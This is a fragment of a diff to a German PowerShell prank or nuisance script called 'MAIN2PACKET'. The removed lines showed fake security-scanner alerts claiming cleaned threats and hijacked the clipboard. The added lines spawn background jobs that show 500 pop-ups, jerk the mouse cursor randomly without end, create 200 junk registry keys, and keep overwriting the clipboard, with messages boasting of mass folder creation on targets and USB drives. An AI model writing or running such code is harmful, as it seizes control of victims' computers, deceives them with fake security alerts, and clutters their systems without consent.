-        "😂😂😂",
-        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-        "👑👑👑",
-        "Scan abgeschlossen - 124.891 Dateien geprüft",
-        "8 Bedrohungen gefunden - bereinigt!"
-    )
-    while ($true) {
-        if ((Get-Random -Minimum 1 -Maximum 30) -eq 1) {
-            $randomText = Get-Random $texts
-            [System.Windows.Forms.Clipboard]::SetText($randomText)
-        }
-        Start-Sleep -Seconds 5
-    }
-}
-
-# ===== FAKE SCANNER POPUP (manchmal) =====
-$scannerPopupJob = Start-Job -ScriptBlock {
+# ===== 500 POP-UPS =====
+$popupJob = Start-Job -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
     
-    while ($true) {
-        Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 900)
-        
-        # Zufällige Scanner-Nachricht
+    for ($pop = 1; $pop -le 500; $pop++) {
         $messages = @(
-            "MAIN2PACKET Security Scan abgeschlossen!`n124.891 Dateien geprüft`n8 Bedrohungen gefunden und bereinigt!",
-            "Systemanalyse erfolgreich!`nKeine weiteren Bedrohungen gefunden.",
-            "Automatischer Scan läuft im Hintergrund...`nFortschritt: 47%",
-            "⚠️ VORSICHT! Verdächtige Aktivität erkannt!`nScan wird empfohlen.",
-            "MAIN2PACKET Security Update verfügbar!`nVersion 9.5.0 installieren?"
+            "📁 1000 ORDNER PRO ZIEL!",
+            "🔥 20 ZIELE = 20.000 ORDNER!",
+            "💥 200.000 DATEIEN INSGESAMT!",
+            "📂 USB: +500 ORDNER!",
+            "⚡ ORDNER #$pop VON 500",
+            "📊 FORTSCHRITT: $([math]::Round($pop/500*100))%"
         )
         
-        $randomMsg = Get-Random $messages
-        [System.Windows.Forms.MessageBox]::Show($randomMsg, "MAIN2PACKET Security Scanner", "OK", "Information")
+        [System.Windows.Forms.MessageBox]::Show(
+            "📁 POP-UP #$pop 📁`n`n" + (Get-Random $messages),
+            "MAIN2PACKET 1000-ORDNER",
+            "OK",
+            "Information"
+        )
+        
+        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 4)
     }
 }
 
-# ===== ALLES LÄUFT - FÜR IMMER =====
-while ($true) {
-    # Statistik im Hintergrund (nichts anzeigen)
-    $totalJobs = Get-Job | Where-Object {$_.State -eq "Running"} | Measure-Object | Select-Object -ExpandProperty Count
+# ===== MAUS-TURBO =====
+$mausJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
     
-    # Alle 5 Minuten prüfen ob Jobs noch laufen
-    Start-Sleep -Seconds 300
-    
-    # Falls ein Job gestorben ist, neu starten (vereinfacht)
-    $deadJobs = Get-Job | Where-Object {$_.State -ne "Running"}
-    foreach ($job in $deadJobs) {
-        Remove-Job $job -Force
+    while ($true) {
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $x = Get-Random -Minimum 0 -Maximum $screen.Width
+        $y = Get-Random -Minimum 0 -Maximum $screen.Height
+        [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
+        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
     }
+}
+
+# ===== REGISTRY =====
+$regJob = Start-Job -ScriptBlock {
+    for ($r = 1; $r -le 200; $r++) {
+        try {
+            New-Item -Path "HKCU:\Software\MAIN2PACKET_$r" -Force | Out-Null
+            New-ItemProperty -Path "HKCU:\Software\MAIN2PACKET_$r" -Name "Ordner" -Value "1000" -Force | Out-Null
+        } catch {}
+    }
+}
+
+# ===== CLIPBOARD =====
+$clipJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    while ($true) {
+        Start-Sleep -Seconds 10
+        [System.Windows.Forms.Clipboard]::SetText("📁 1000 ORDNER PRO ZIEL - GESAMT: " + (Get-Random -Minimum 20000 -Maximum 30000) + " ORDNER")
+    }
+}
+
+# ===== ALLES LÄUFT =====
+while ($true) {
+    Start-Sleep -Seconds 30
 }
